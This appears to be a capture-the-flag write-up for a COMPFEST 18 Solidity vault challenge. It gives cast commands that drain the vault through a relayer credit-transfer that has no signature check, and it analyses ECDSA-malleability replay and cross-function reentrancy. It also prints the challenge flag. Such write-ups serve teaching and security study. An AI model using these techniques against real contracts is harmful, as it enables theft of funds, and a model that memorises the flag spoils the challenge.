@@ -1,0 +1,213 @@
+---
+title: 'COMPFEST 18 - Phantom Ledger'
+description: 'Draining a meta-transaction vault through a relayer credit-transfer with no signature check, plus the intended ECDSA malleability and cross-function reentrancy chain'
+date: 2026-08-30
+tags: ['writeup', 'blockchain', 'solidity', 'access-control', 'reentrancy', 'ecdsa-malleability', 'compfest', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A gasless meta-transaction vault where `Setup` quietly installs the player as the "trusted relayer". The flag text advertises a long ECDSA-malleability + reentrancy chain, but the relayer role alone drains the vault in two transactions.
+
+## Challenge Description
+
+> A cutting-edge DeFi vault called **PhantomVault** has been deployed to the blockchain. It supports gasless meta-transactions, allowing users to deposit ETH and authorize withdrawals through signed messages — submitted by a trusted relayer on their behalf.
+>
+> The vault holds **10 ETH** belonging to the protocol. Your mission: drain it.
+
+Files: `PhantomVault.sol`, `Setup.sol`. Infra is the standard [TCP1P blockchain launcher](https://github.com/TCP1P/TCP1P-CTF-Blockchain-Infra) (`POST /launch`, `GET /status`, `GET /data`, `GET /flag`), which hands you an RPC URL, a funded private key and the `Setup` address.
+
+## Initial Analysis
+
+```solidity
+contract Setup {
+    PhantomVault public vault;
+
+    constructor(address _player) payable {
+        vault = new PhantomVault{value: msg.value}(_player, _player);
+    }
+
+    function isSolved() external view returns (bool) {
+        return address(vault).balance == 0;
+    }
+}
+```
+
+Two things fall out of that one line, and they are the whole challenge:
+
+1. `msg.value` (10 ETH) flows into the vault constructor, which credits **the deployer**:
+
+   ```solidity
+   constructor(address _relayer, address _feeRecipient) payable {
+       owner = msg.sender;
+       relayer = _relayer;
+       feeRecipient = _feeRecipient;
+       feeRate = 200;
+       _locked = 0;
+
+       if (msg.value > 0) {
+           balances[msg.sender] += msg.value;   // balances[Setup] = 10 ETH
+           emit Deposit(msg.sender, msg.value);
+       }
+   }
+   ```
+
+   So the protocol's 10 ETH sits in `balances[address(Setup)]`, an address nobody can sign for.
+
+2. `_relayer` and `_feeRecipient` are both `_player`. **You are the trusted relayer.**
+
+Confirmed on-chain right after launching:
+
+```console
+$ cast call $SETUP "vault()(address)" --rpc-url $RPC
+0x1786117B83BA224938EeeEAE7BcC5DE6915277C7
+
+$ cast balance $VAULT --rpc-url $RPC
+10000000000000000000
+$ cast call $VAULT "owner()(address)"        --rpc-url $RPC   # = Setup
+0x094DB6aFb10FD73f16C8272e0078f73684506b4a
+$ cast call $VAULT "relayer()(address)"      --rpc-url $RPC   # = me
+0x810Ca428bB8ad9ca6e2a7bB8eE60d00c8A0794Fc
+$ cast call $VAULT "feeRecipient()(address)" --rpc-url $RPC   # = me
+0x810Ca428bB8ad9ca6e2a7bB8eE60d00c8A0794Fc
+$ cast call $VAULT "balances(address)(uint256)" $SETUP --rpc-url $RPC
+10000000000000000000 [1e19]
+```
+
+The deployed state matches the provided source exactly — nothing was patched between the handout and the deployment.
+
+## The Vulnerability
+
+`PhantomVault.sol:113` — broken authorization in `transferCredit`:
+
+```solidity
+function transferCredit(address from, address to, uint256 amount) external {
+    require(msg.sender == from || msg.sender == relayer, "Not authorized");
+    require(balances[from] >= amount, "Insufficient credit");
+
+    balances[from] -= amount;
+    balances[to]   += amount;
+
+    emit CreditTransfer(from, to, amount);
+}
+```
+
+The `msg.sender == from` branch is the correct one: move your own credit. The `msg.sender == relayer` branch is meant to make the function relayable on a user's behalf — but `from` is an unconstrained caller-supplied argument, and there is **no signature check on that path at all**. A relayer can therefore reassign the internal credit of *any* address to *any* other address.
+
+The relayer is supposed to be a trusted third party. `Setup` makes it the player. Combine the two and the ledger entry for the protocol's 10 ETH is simply attacker-writable — no meta-transaction, no signature, no reentrancy required.
+
+Both preconditions are needed, and `Setup` hands over the second one for free.
+
+## Exploitation
+
+Two transactions: rewrite the ledger, then walk out the front door via the ordinary `withdraw`.
+
+```bash
+RPC=http://34.2.147.230:8502/<instance-uuid>
+PK=0x<privkey from /data>
+SETUP=0x094DB6aFb10FD73f16C8272e0078f73684506b4a
+ME=0x810Ca428bB8ad9ca6e2a7bB8eE60d00c8A0794Fc
+VAULT=$(cast call $SETUP "vault()(address)" --rpc-url $RPC)
+
+# 1. as the relayer, move the protocol's credit onto our own account
+cast send $VAULT "transferCredit(address,address,uint256)" \
+    $SETUP $ME 10000000000000000000 --private-key $PK --rpc-url $RPC
+
+# 2. withdraw it normally — balances[ME] is now 10 ETH
+cast send $VAULT "withdraw(uint256)" \
+    10000000000000000000 --private-key $PK --rpc-url $RPC
+```
+
+`withdraw` needs no tricks once step 1 lands — the `nonReentrant` guard and the `balances[msg.sender] >= amount` check are both satisfied honestly:
+
+```solidity
+function withdraw(uint256 amount) external nonReentrant {
+    require(balances[msg.sender] >= amount, "Insufficient balance");
+    balances[msg.sender] -= amount;
+    (bool success, ) = payable(msg.sender).call{value: amount}("");
+    require(success, "ETH transfer failed");
+    emit Withdraw(msg.sender, amount);
+}
+```
+
+Result:
+
+```console
+bal[me] after tx1: 10000000000000000000 [1e19]
+vault balance:     0
+my balance:        14999903283000000000     # 5 ETH start + 10 ETH − gas
+isSolved:          true
+```
+
+```console
+$ curl -s -b jar.txt http://34.2.147.230:8502/flag
+{"flag":"COMPFEST18{ph4nt0m_l3dg3r_cr0ss_funct10n_r33ntr4ncy_w1th_ecdsa_m4ll3ab1l1ty}", ...}
+```
+
+## The intended path (per the flag text)
+
+The flag names **cross-function reentrancy + ECDSA malleability**, so the author planted a second, longer chain. Both halves of it are genuinely present.
+
+### ECDSA malleability — the replay guard keys on the wrong thing
+
+```solidity
+bytes32 sigHash = keccak256(signature);
+require(!usedSignatures[sigHash], "Signature already used");
+```
+
+The nonce is only hashed into the *message*; the replay set is keyed on the **raw 65-byte signature blob**, not on `(signer, nonce)` or on the message hash. secp256k1 signatures are malleable, so one authorization has several distinct byte encodings that all recover to the same signer:
+
+- `(r, s, v)` and `(r, n − s, v ^ 1)` where `n` is the curve order — `ecrecover` has no `s <= n/2` (EIP-2) check here, so the flipped form is accepted.
+- `_recoverSigner` normalizes low `v`:
+
+  ```solidity
+  if (v < 27) { v += 27; }
+  require(v == 27 || v == 28, "Invalid v value");
+  ```
+
+  so `v ∈ {0, 27}` and `v ∈ {1, 28}` are interchangeable byte-wise while recovering identically.
+
+That is **4 distinct `keccak256(signature)` values for one authorization**, and `usedSignatures` only ever burns the exact blob that was submitted. A single signed withdrawal can be replayed four times.
+
+Note the message hash also uses `abi.encodePacked(to, amount, nonce, address(this))` — all fixed-width types, so there is no packed-encoding collision here, and `address(this)` at least pins the domain. The malleability is the live issue.
+
+### The reentrancy surface — a state gap plus an unguarded function
+
+`relayWithdraw` makes **two** attacker-reachable external calls, and `feeRecipient` is the player:
+
+```solidity
+balances[signer] -= amount;
+if (fee > 0 && feeRecipient != address(0)) {
+    (bool feeSuccess, ) = payable(feeRecipient).call{value: fee}("");   // <-- attacker code
+    require(feeSuccess, "Fee transfer failed");
+}
+
+(bool success, ) = payable(to).call{value: netAmount}("");             // <-- attacker code
+require(success, "Withdrawal transfer failed");
+```
+
+`nonReentrant` covers `withdraw` and `relayWithdraw`, but **`transferCredit` carries no guard** — that is the "cross-function" part: `_locked == 1` does not stop a reenter into `transferCredit`, so credit can be shuffled mid-withdrawal while the vault's own accounting is half-applied. `setFeeRecipient` is likewise callable by the relayer at any time, so the fee callback can be pointed at an arbitrary contract.
+
+### One thing that looks like a bug but isn't
+
+The `unchecked` fee is a deliberate red herring:
+
+```solidity
+uint256 fee;
+unchecked {
+    fee = (amount * feeRate) / 10000;   // amount * 200 can wrap
+}
+uint256 netAmount = amount - fee;       // checked — reverts if fee > amount
+```
+
+`amount * feeRate` really can wrap mod 2²⁵⁶, but `netAmount = amount - fee` sits **outside** the `unchecked` block, so any wrap large enough to make `fee > amount` reverts on the 0.8 underflow check. And when it doesn't revert, the contract pays out `fee + (amount − fee) == amount` against a `balances[signer] -= amount` debit. Payout always equals the debit — the overflow redistributes value between `feeRecipient` and `to` but never creates any.
+
+### Why the intended chain isn't needed
+
+Every one of those primitives operates on `balances[signer]`, and `relayWithdraw` enforces `require(balances[signer] >= amount, "Insufficient signer balance")`. You can only sign as an address you hold the key for, and `ecrecover` on garbage `(r, s, v)` yields a uniformly random address with a zero balance. So the whole meta-transaction machinery gets you leverage over *your own* credit — the 10 ETH still has to be moved out of `balances[address(Setup)]` first, and `transferCredit`'s relayer branch does that in one call with no signature at all. Once the credit is yours, plain `withdraw` finishes the job and the replay/reentrancy chain has nothing left to do.
+
+## Flag
+
+```text
+COMPFEST18{ph4nt0m_l3dg3r_cr0ss_funct10n_r33ntr4ncy_w1th_ecdsa_m4ll3ab1l1ty}
+```
